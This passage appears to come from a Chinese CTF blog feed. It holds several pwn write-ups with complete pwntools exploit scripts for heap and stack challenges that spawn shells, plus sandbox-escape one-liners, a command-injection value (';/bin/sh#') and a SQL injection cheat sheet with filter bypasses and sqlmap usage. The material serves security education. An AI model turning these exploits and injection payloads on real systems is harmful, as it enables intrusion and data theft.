class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">context.log_level=&apos;debug&apos;</span><br><span class="line">sh=process(&apos;./100levels&apos;)</span><br><span class="line">#sh=remote(&apos;111.198.29.45&apos;,&apos;32440&apos;)</span><br><span class="line">elf = ELF(&apos;./100levels&apos;)</span><br><span class="line">libc = ELF(&apos;./libc.so&apos;)</span><br><span class="line"></span><br><span class="line">def go(level,more):</span><br><span class="line">sh.recvuntil(&apos;Choice:\n&apos;)</span><br><span class="line">sh.sendline(&apos;1&apos;)</span><br><span class="line">sh.recvuntil(&apos;levels?\n&apos;)</span><br><span class="line">sh.sendline(str(level))</span><br><span class="line">sh.recvuntil(&apos;more?\n&apos;)</span><br><span class="line">sh.sendline(str(more))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def hint():</span><br><span class="line">sh.sendlineafter(&apos;Choice:\n&apos;,&apos;2&apos;)</span><br><span class="line"></span><br><span class="line">def calc(answer):</span><br><span class="line">sh.sendlineafter(&apos;Answer:&apos;,answer)</span><br><span class="line"></span><br><span class="line">def leak():</span><br><span class="line">start = 0x700000000390</span><br><span class="line">for i in range(10,2,-1):</span><br><span class="line">for j in range(15,-1,-1):</span><br><span class="line">hint()</span><br><span class="line">addr_test = start+(1 &lt;&lt; (i*4)*j)</span><br><span class="line">go(0,-addr_test)</span><br><span class="line">a = sh.recvline()</span><br><span class="line"></span><br><span class="line">if &apos;Coward&apos; not in a:</span><br><span class="line">                start = addr_test</span><br><span class="line">log.info(&apos;check &apos;+ hex(addr_test))</span><br><span class="line">                break</span><br><span class="line">        pro = log.progress(&apos;go&apos;)</span><br><span class="line">        for i in range(99):</span><br><span class="line">            pro.status(&apos;level %d&apos;%(i+1))</span><br><span class="line">            calc(p64(0)*5)</span><br><span class="line">        #gdb.attach(sh)</span><br><span class="line">calc(p64(0)*5+p64(0xffffffffff600400)*3)</span><br><span class="line">       #gdb.attach(sh)</span><br><span class="line">pro.success(&apos;ok&apos;)</span><br><span class="line">return start + 0x100</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">system=leak()</span><br><span class="line">print system</span><br><span class="line"></span><br><span class="line">binsh_addr = system - libc.symbols[&apos;system&apos;]+libc.search(&apos;/bin/sh&apos;).next()</span><br><span class="line">pop_rdi_ret = system - libc.symbols[&apos;system&apos;]+0x21102</span><br><span class="line"></span><br><span class="line">pay = p64(pop_rdi_ret)+p64(binsh_addr)+p64(system)</span><br><span class="line">go(1,0)</span><br><span class="line">pay = &apos;0&apos;*0x38+pay</span><br><span class="line">calc(pay)</span><br><span class="line">#gdb.attach(sh)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure><p>参考：<br><a href="https://bbs.ichunqiu.com/thread-43627-1-1.html" target="_blank" rel="noopener">https://bbs.ichunqiu.com/thread-43627-1-1.html</a><br><a href="https://nandynarwhals.org/hitbgsec2017-1000levels/" target="_blank" rel="noopener">https://nandynarwhals.org/hitbgsec2017-1000levels/</a><br><a href="https://znqt.github.io/hitb-gsec-pwn-1000levels/" target="_blank" rel="noopener">https://znqt.github.io/hitb-gsec-pwn-1000levels/</a></p><h1 id="monkey"><a href="#monkey" class="headerlink" title="monkey"></a>monkey</h1><h2 id="题目-amp-分析-amp-exp"><a href="#题目-amp-分析-amp-exp" class="headerlink" title="题目 &amp; 分析 &amp; exp"></a>题目 &amp; 分析 &amp; exp</h2><p>算是js的沙箱逃逸，给了个The SpiderMonkey shell，可以查询到它的源码之类的东西，<br>可以发现其没有任何过滤，所以给个os.system(“/bin/sh”) 直接拿shell即可</p><h1 id="Escape-From-Jail-50"><a href="#Escape-From-Jail-50" class="headerlink" title="Escape_From_Jail-50"></a>Escape_From_Jail-50</h1><h2 id="题目-1"><a href="#题目-1" class="headerlink" title="题目"></a>题目</h2><p>python沙箱逃逸，只给了个远程连接，检测到被过滤的字符会报错</p><p>banned：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.  / &apos; /  import /flag /eval /exec / dir(__builtins__)无反馈 等等</span><br></pre></td></tr></table></figure></p><h2 id="分析-amp-exp"><a href="#分析-amp-exp" class="headerlink" title="分析 &amp; exp"></a>分析 &amp; exp</h2><p>许多常见的基本上都被过滤了</p><p>不能使用import关键字且不允许使用 “.”，一大部分路就被绝了,</p><p>os，未被过滤，但是基本调用需要”.”,所以需要其他方式。</p><p>查询资料发现 getattr函数可以使用</p><p>相关资料可以看菜鸟：<a href="http://www.runoob.com/python/python-func-getattr.html" target="_blank" rel="noopener">http://www.runoob.com/python/python-func-getattr.html</a></p><p>getattr(os,”system”)(“/bin/sh”)</p><h1 id="time-formatter"><a href="#time-formatter" class="headerlink" title="time_formatter"></a>time_formatter</h1><p>比较有意思的一个题目，刚开始没看懂题。。</p><h2 id="题目-2"><a href="#题目-2" class="headerlink" title="题目"></a>题目</h2><p>重点函数</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">__int64 __fastcall print(__int64 a1, __int64 a2, __int64 a3)</span><br><span class="line">&#123;</span><br><span class="line">  __int64 v3; // r8</span><br><span class="line">  char command; // [rsp+8h] [rbp-810h]</span><br><span class="line">  unsigned __int64 v6; // [rsp+808h] [rbp-10h]</span><br><span class="line"></span><br><span class="line">  v6 = __readfsqword(0x28u);</span><br><span class="line">  if ( ptr )</span><br><span class="line">  &#123;</span><br><span class="line">    __snprintf_chk(&amp;command, 2048LL, 1LL, 2048LL, &quot;/bin/date -d @%d +&apos;%s&apos;&quot;, (unsigned int)time, ptr, a3);</span><br><span class="line">    __printf_chk(1LL, &quot;Your formatted time is: &quot;);</span><br><span class="line">    fflush(stdout);</span><br><span class="line">    if ( getenv(&quot;DEBUG&quot;) )</span><br><span class="line">      __fprintf_chk(stderr, 1LL, &quot;Running command: %s\n&quot;, &amp;command, v3);</span><br><span class="line">    setenv(&quot;TZ&quot;, value, 1);</span><br><span class="line">    system(&amp;command);</span><br><span class="line">  &#125;</span><br><span class="line">  else</span><br><span class="line">  &#123;</span><br><span class="line">    puts(&quot;You haven&apos;t specified a format!&quot;);</span><br><span class="line">  &#125;</span><br><span class="line">  return 0LL;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>退出<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">signed __int64 __noreturn exit()</span><br><span class="line">&#123;</span><br><span class="line">  signed __int64 result; // rax</span><br><span class="line">  char s; // [rsp+8h] [rbp-20h]</span><br><span class="line">  unsigned __int64 v2; // [rsp+18h] [rbp-10h]</span><br><span class="line"></span><br><span class="line">  v2 = __readfsqword(0x28u);</span><br><span class="line">  free__(ptr);</span><br><span class="line">  free__(value);</span><br><span class="line">  __printf_chk(1LL, &quot;Are you sure you want to exit (y/N)? &quot;);</span><br><span class="line">  fflush(stdout);</span><br><span class="line">  fgets(&amp;s, 16, stdin);</span><br><span class="line">  result = 0LL;</span><br><span class="line">  if ( (s &amp; 0xDF) == 89 )</span><br><span class="line">  &#123;</span><br><span class="line">    puts(&quot;OK, exiting.&quot;);</span><br><span class="line">    result = 1LL;</span><br><span class="line">  &#125;</span><br><span class="line">  return result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><h2 id="分析-amp-amp-exp"><a href="#分析-amp-amp-exp" class="headerlink" title="分析&amp;&amp;exp"></a>分析&amp;&amp;exp</h2><p>问题出在退出时先free然后再询问是否退出，这个时候选择不退出的话就会出现UAF漏洞</p><p>在system中执行command命令，command字符串通过snprintf_chk函数拼接起来，可以百度一下这个函数的用法，注意字符串/bin/date -d @%d +’%s’，按照linux 64的函数传参顺序，分别是rdi rsi rdx rcx r8 r9 然后是栈 ，所以此时%s对应第一个入栈的参数，也就是rax 也就是qword_602118，所以只要控制了qword_602118，就可以执行任意系统命令（注意闭合单引号）。</p><p>所以依次执行 1，5 / N ，3 / ‘;/bin/sh#’ , 4 即可</p><h2 id="babyheap"><a href="#babyheap" class="headerlink" title="babyheap"></a>babyheap</h2><h2 id="题目-amp-amp-分析"><a href="#题目-amp-amp-分析" class="headerlink" title="题目&amp;&amp;分析"></a>题目&amp;&amp;分析</h2><p>正常题目，edit时没有检查存储的size</p><p>所以虽然保护全开，我们仍然可以使用溢出来overlap来泄露地址及其他</p><h2 id="exp-1"><a href="#exp-1" class="headerlink" title="exp"></a>exp</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">context.log_level = &apos;debug&apos;</span><br><span class="line"></span><br><span class="line">#sh=process(&apos;./babyheap&apos;)</span><br><span class="line">sh = remote(&apos;111.198.29.45&apos;,&apos;31717&apos;)</span><br><span class="line">elf = ELF(&apos;./babyheap&apos;)</span><br><span class="line">libc = ELF(&apos;./libc-2.23.so&apos;)</span><br><span class="line"></span><br><span class="line">def show(idx):</span><br><span class="line">sh.sendlineafter(&apos;&gt;&gt; &apos;,&apos;3&apos;)</span><br><span class="line">sh.sendline(str(idx))</span><br><span class="line"></span><br><span class="line">def new(length,con):</span><br><span class="line">sh.sendlineafter(&apos;&gt;&gt; &apos;,&apos;1&apos;)</span><br><span class="line">sh.sendline(str(length))</span><br><span class="line">sh.send(con)</span><br><span class="line"></span><br><span class="line">def edit(idx,length,con):</span><br><span class="line">        sh.sendlineafter(&apos;&gt;&gt; &apos;,&apos;2&apos;)</span><br><span class="line">        sh.sendline(str(idx))</span><br><span class="line">        sh.sendline(str(length))</span><br><span class="line">sh.send(con)</span><br><span class="line"></span><br><span class="line">def dele(idx):</span><br><span class="line">        sh.sendlineafter(&apos;&gt;&gt; &apos;,&apos;4&apos;)</span><br><span class="line">        sh.sendline(str(idx))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">new(0x10,&apos;a&apos;*0x10)  #0</span><br><span class="line">new(0x10,&apos;b&apos;*0x10)  #1</span><br><span class="line">new(0x10,&apos;c&apos;*0x10)  #2</span><br><span class="line">new(0x10,&apos;d&apos;*0x10)  #3</span><br><span class="line">new(0x10,&apos;e&apos;*0x10)  #4</span><br><span class="line"></span><br><span class="line">#--------------leak heap base----------------</span><br><span class="line">edit(0,0x20,&apos;a&apos;*0x18+p64(0x41))</span><br><span class="line">dele(1)</span><br><span class="line">new(0x30,&apos;b&apos;*0x18+p64(0x21)+&apos;c&apos;*0x10)  #1</span><br><span class="line">dele(4)</span><br><span class="line">dele(2)</span><br><span class="line">show(1)</span><br><span class="line">sh.recvuntil(p64(0x21))</span><br><span class="line">heap = u64(sh.recv(8))-0x80</span><br><span class="line">print &apos;heap_base: &apos;+hex(heap)</span><br><span class="line">#--------------leak libc base----------------</span><br><span class="line">new(0x10,&apos;b&apos;*0x10)  #2</span><br><span class="line">new(0x10,&apos;e&apos;*0x10)  #4</span><br><span class="line">new(0x10,&apos;f&apos;*0x10)  #5</span><br><span class="line"></span><br><span class="line">new(0x10,&apos;deadbeef&apos;*2) #6</span><br><span class="line">#new(0x90,&apos;c&apos;*0x90)</span><br><span class="line"></span><br><span class="line">edit(0,0x28,&apos;a&apos;*0x18+p64(0xa1)+&apos;a&apos;*8)</span><br><span class="line">#gdb.attach(sh)</span><br><span class="line">dele(1)</span><br><span class="line">new(0x10,&apos;b&apos;*0x10)  #1</span><br><span class="line">#gdb.attach(sh)</span><br><span class="line">show(2)</span><br><span class="line">main_arena = u64(sh.recv(8))-88</span><br><span class="line">malloc_hook = main_arena - 0x10</span><br><span class="line">libc.base = malloc_hook - libc.symbols[&apos;__malloc_hook&apos;]</span><br><span class="line">one_gadget = libc.base+0x4526a</span><br><span class="line">print &apos;libc: &apos;+hex(libc.base)</span><br><span class="line">#------------hjack malloc_hook to getshell----------</span><br><span class="line">new(0x70,&apos;c&apos;*0x60+p64(0)+p64(0x31))  #2 &amp; 7</span><br><span class="line">edit(1,0x28,&apos;b&apos;*0x18+p64(0x71)+&apos;c&apos;*8)</span><br><span class="line">dele(7)</span><br><span class="line">edit(2,8,p64(main_arena-0x33))</span><br><span class="line">new(0x60,&apos;c&apos;*0x60)</span><br><span class="line">new(0x63,&apos;a&apos;*0x13+p64(one_gadget)+p64(0)*9)</span><br><span class="line">new(1,&apos;a&apos;)</span><br><span class="line">#gdb.attach(sh)</span><br><span class="line"></span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;100levels&quot;&gt;&lt;a href=&quot;#100levels&quot; class=&quot;headerlink&quot; title=&quot;100levels&quot;&gt;&lt;/a&gt;100levels&lt;/h1&gt;&lt;h2 id=&quot;题目&quot;&gt;&lt;a href=&quot;#题目&quot; class=&quot;headerlink&quot; 
      
    
    </summary>
    
      <category term="stack" scheme="http://siriuswhiter.tk/categories/stack/"/>
    
    
      <category term="pwn" scheme="http://siriuswhiter.tk/tags/pwn/"/>
    
      <category term="stack" scheme="http://siriuswhiter.tk/tags/stack/"/>
    
      <category term="heap" scheme="http://siriuswhiter.tk/tags/heap/"/>
    
  </entry>
  
  <entry>
    <title>Sql Injection</title>
    <link href="http://siriuswhiter.tk/2019/04/01/sql-injection/"/>
    <id>http://siriuswhiter.tk/2019/04/01/sql-injection/</id>
    <published>2019-04-01T02:18:22.000Z</published>
    <updated>2019-04-05T01:41:46.105Z</updated>
    
    <content type="html"><![CDATA[<p>#Sql Injection</p><h2 id="常用语法"><a href="#常用语法" class="headerlink" title="常用语法"></a>常用语法</h2><ol><li>注释： </li></ol><ul><li>–   （注意后面必须要留空格，否则无法达到注释的效果；</li><li>#</li></ul><ol start="2"><li>group_concat （连接字符串，一次性注入；</li></ol><h2 id="检测过滤字符"><a href="#检测过滤字符" class="headerlink" title="检测过滤字符"></a>检测过滤字符</h2><p>‘^(text)^’</p><p>如果text为假，那么页面就会显示正确，所以假如检测是否过滤union, 写入’^(length(union)==0)^’，如果正确就是过滤了</p><h2 id="应对过滤字符"><a href="#应对过滤字符" class="headerlink" title="应对过滤字符"></a>应对过滤字符</h2><ol start="0"><li>大小写绕过； 因为sql本身对大小写不敏感，也就是SELECT与 select本身是一致的，有的检查过松是可以通过大小写绕过的比如说 SeLEct</li><li>双写 ；因为很多情况下是将被过滤的字符替换为空，这种情况下就可以使用双写绕过，比如说 selselectect</li><li>/**/ ;</li><li>updatexml 报错注入;（最终内部细节与其他的基本一致；</li><li>concat被过滤：make_set() lpad()、reverse()、repeat()、export_set()（lpad()、reverse()、repeat()等冷门字符串处理函数</li><li>使用运算符号； 运算符进行运算的时候会先观察左右两端的数据类型是否相同，不同的话就会进行数据强制的转换；所以如果知道是字符串的话，会被强制转换为0；<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">select * from info where username=0; </span><br><span class="line">select * from info where username=&apos;admin&apos;-0-&apos;&apos;; --&gt;减法</span><br></pre></td></tr></table></figure></li></ol><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">* table: </span><br><span class="line">select * from info where id=-1 and updatexml(1,concat(&apos;~&apos;,(select group_concat(table_name) from information_schema.tables where table_schema=database()),&apos;~&apos;),3) ;  --&gt; updatexml 三个参数，不随表行数变化。</span><br></pre></td></tr></table></figure><h2 id="mysql-约束攻击"><a href="#mysql-约束攻击" class="headerlink" title="mysql 约束攻击"></a>mysql 约束攻击</h2><p>由于mysql对于字符串验证不严格，因而在检验时，’admin’与’admin   ‘被认为是等价的，也就是说可以使非管理员用户以管理员身份读取数据库信息</p><p>## </p><h3 id="database"><a href="#database" class="headerlink" title="database"></a>database</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select database();</span><br></pre></td></tr></table></figure><h3 id="table"><a href="#table" class="headerlink" title="table"></a>table</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from info where id=-1 union select 1,2,3,group_concat(table_name) from information_schema.tables where table_schema=database();</span><br></pre></td></tr></table></figure><h3 id="column"><a href="#column" class="headerlink" title="column"></a>column</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from info where id=-1 union select 1,2,3,group_concat(column_name) from information_schema.columns where table_schema=database() and table_name=&apos;info&apos;;</span><br></pre></td></tr></table></figure><h2 id="Sqlmap"><a href="#Sqlmap" class="headerlink" title="Sqlmap"></a>Sqlmap</h2><h2 id="mysql"><a href="#mysql" class="headerlink" title="mysql"></a>mysql</h2><p>-r + ‘filename’<br>-p + ‘sqlinjection_name’   –dbs<br>-D + ‘database_name’  –tables<br>-T + ‘table_name’     –columns<br>-C + ‘column_name’    –dump</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;#Sql Injection&lt;/p&gt;
&lt;h2 id=&quot;常用语法&quot;&gt;&lt;a href=&quot;#常用语法&quot; class=&quot;headerlink&quot; title=&quot;常用语法&quot;&gt;&lt;/a&gt;常用语法&lt;/h2&gt;&lt;ol&gt;
&lt;li&gt;注释： &lt;/li&gt;
&lt;/ol&gt;
&lt;ul&gt;
&lt;li&gt;–   （注意后面
      
    
    </summary>
    
      <category term="web" scheme="http://siriuswhiter.tk/categories/web/"/>
    
    
      <category term="web" scheme="http://siriuswhiter.tk/tags/web/"/>
    
      <category term="sql" scheme="http://siriuswhiter.tk/tags/sql/"/>
    
  </entry>
  
  <entry>
    <title>Pwn practice</title>
    <link href="http://siriuswhiter.tk/2019/03/29/pwn-practice/"/>
    <id>http://siriuswhiter.tk/2019/03/29/pwn-practice/</id>
    <published>2019-03-28T23:35:02.000Z</published>
    <updated>2019-03-30T03:07:43.235Z</updated>
    
    <content type="html"><![CDATA[<h1 id="fheap"><a href="#fheap" class="headerlink" title="fheap"></a>fheap</h1><p>来源：<a href="https://github.com/zh-explorer/hctf2016-fheap/blob/master/main.c" target="_blank" rel="noopener">https://github.com/zh-explorer/hctf2016-fheap/blob/master/main.c</a></p><h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><p>只有两个功能：add delete</p><p>add 初始时会分配一个struct，然后会分两种情况： </p><ol><li>长度小于16时，不再申请新的chunk，原结构体的前十六个字节用于接收用户输入； </li><li>长度大于16时，会申请一个新的chunk，用于存放data，此时原结构体的前八个字节存放着指向新chunk的指针。</li></ol><p>原结构体的最后十六个字节，会分别存放size 及 对应的 free函数</p><p>这里可以看到输入的size没有任何卵用，后面还是根据输入的长度来确定的。</p><p>delete 会检查存放在bss段的指针，指针存在就可以释放</p><h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><p>delete 函数有明显的漏洞，之前本来设置了inuse位，但是并没有检查，同时指针仅仅是free而没有置为空，所以可以double free;</p><p>还有问题就是指针同时存放在堆中，一般而言，这样很容易造成劫持；</p><p>不过这次没有show函数，也就是说，没有办法直接通过输出泄露地址，这样一般就需要劫持指针或者是最低位修改；</p><p>而且这次有个问题就是或许是因为没有设置缓冲区的原因，前面输入的chunk data在后面新建chunk会直接赋值过去，这样子造成如果初始时分配大的chunk,后面就没办法分配到小chunk了。</p><h2 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">context.log_level = &apos;debug&apos;</span><br><span class="line">context.terminal = [&apos;deepin-terminal&apos;, &apos;-x&apos;, &apos;sh&apos; ,&apos;-c&apos;]</span><br><span class="line">name = &apos;./pwnf&apos;</span><br><span class="line">p = process(name)</span><br><span class="line">elf= ELF(name)</span><br><span class="line"></span><br><span class="line"># puts_offset = 0xd1a </span><br><span class="line"># printf_pffset = 0xdbb</span><br><span class="line">def create(num,data):</span><br><span class="line">    p.recvuntil(&apos;3.quit\n&apos;)</span><br><span class="line">    p.sendline(&apos;create &apos;)</span><br><span class="line">    p.recvuntil(&apos;Pls give string size:&apos;)</span><br><span class="line">    p.sendline(str(num))</span><br><span class="line">    p.recvuntil(&apos;str:&apos;)</span><br><span class="line">    p.send(data)</span><br><span class="line">    </span><br><span class="line">def delete(num):</span><br><span class="line">    p.recvuntil(&apos;3.quit\n&apos;)</span><br><span class="line">    p.sendline(&apos;delete &apos;)</span><br><span class="line">    p.recvuntil(&apos;id:&apos;)</span><br><span class="line">    p.sendline(str(num))</span><br><span class="line">    p.recvuntil(&apos;Are you sure?:&apos;)</span><br><span class="line">    p.send(&quot;yes&quot;)</span><br><span class="line">   </span><br><span class="line">create(5,&apos;a&apos;*5)     #0</span><br><span class="line">create(5,&apos;b&apos;*5)     #1</span><br><span class="line"></span><br><span class="line">delete(1)</span><br><span class="line">delete(0)</span><br><span class="line"></span><br><span class="line">#leak</span><br><span class="line">pay1 = &apos;q&apos;*20 + &apos;s&apos;*4 + &apos;\x1a&apos;</span><br><span class="line">create(32,pay1)</span><br><span class="line">delete(1)</span><br><span class="line">p.recvuntil(&apos;s&apos;*4)</span><br><span class="line">puts_addr = u64(p.recv(6) + &apos;\x00\x00&apos;)</span><br><span class="line">proc_base = puts_addr - 0xd1a </span><br><span class="line">printf_addr = proc_base + 0x9d0</span><br><span class="line"></span><br><span class="line">delete(0)</span><br><span class="line">pay2 = &apos;a&apos;*8 + &apos;%30$p&apos; + &apos;s&apos;*11 + p64(printf_addr) </span><br><span class="line">create(32,pay2)</span><br><span class="line">delete(1)</span><br><span class="line">x = p.recv()</span><br><span class="line">libc_addr = int(x[8:22],16) - 0x3b5760</span><br><span class="line">system_addr = libc_addr + 0x42510</span><br><span class="line"></span><br><span class="line">#getshell</span><br><span class="line">p.sendline(&apos;&apos;)</span><br><span class="line">delete(0)</span><br><span class="line">pay3 = &apos;/bin/sh;&apos; + &apos;s&apos;*16 + p64(system_addr) </span><br><span class="line">create(32,pay3)</span><br><span class="line">delete(1)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;fheap&quot;&gt;&lt;a href=&quot;#fheap&quot; class=&quot;headerlink&quot; title=&quot;fheap&quot;&gt;&lt;/a&gt;fheap&lt;/h1&gt;&lt;p&gt;来源：&lt;a href=&quot;https://github.com/zh-explorer/hctf2016-fheap/
      
    
    </summary>
    
      <category term="pwn" scheme="http://siriuswhiter.tk/categories/pwn/"/>
    
    
      <category term="pwn" scheme="http://siriuswhiter.tk/tags/pwn/"/>
    
      <category term="heap" scheme="http://siriuswhiter.tk/tags/heap/"/>
    
  </entry>
  
  <entry>
    <title>0ctf-2019-pwn&amp;re</title>
    <link href="http://siriuswhiter.tk/2019/03/26/0ctf-2019-pwn-re/"/>
    <id>http://siriuswhiter.tk/2019/03/26/0ctf-2019-pwn-re/</id>
    <published>2019-03-26T12:36:28.000Z</published>
    <updated>2019-04-17T15:13:10.662Z</updated>
    
    <content type="html"><![CDATA[<p><em>这次的0ctf真的溃不成军，看了一些题心态爆炸</em></p><h1 id="babyheap"><a href="#babyheap" class="headerlink" title="babyheap"></a>babyheap</h1><h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><p>还是和前两年一个风格，不过将2018的漏洞去掉了，在update时会有一个字节的溢出，溢出内容不可控，只能是’\x00’</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">unsigned __int64 __fastcall get_str2(__int64 des, unsigned __int64 size)</span><br><span class="line">&#123;</span><br><span class="line">  unsigned __int64 v3; // [rsp+10h] [rbp-10h]</span><br><span class="line">  ssize_t v4; // [rsp+18h] [rbp-8h]</span><br><span class="line"></span><br><span class="line">  if ( !size )</span><br><span class="line">    return 0LL;</span><br><span class="line">  v3 = 0LL;</span><br><span class="line">  while ( v3 &lt; size )</span><br><span class="line">  &#123;</span><br><span class="line">    v4 = read(0, (void *)(v3 + des), size - v3);</span><br><span class="line">    if ( v4 &gt; 0 )</span><br><span class="line">    &#123;</span><br><span class="line">      v3 += v4;</span><br><span class="line">    &#125;</span><br><span class="line">    else if ( *__errno_location() != 11 &amp;&amp; *__errno_location() != 4 )</span><br><span class="line">    &#123;</span><br><span class="line">      break;</span><br><span 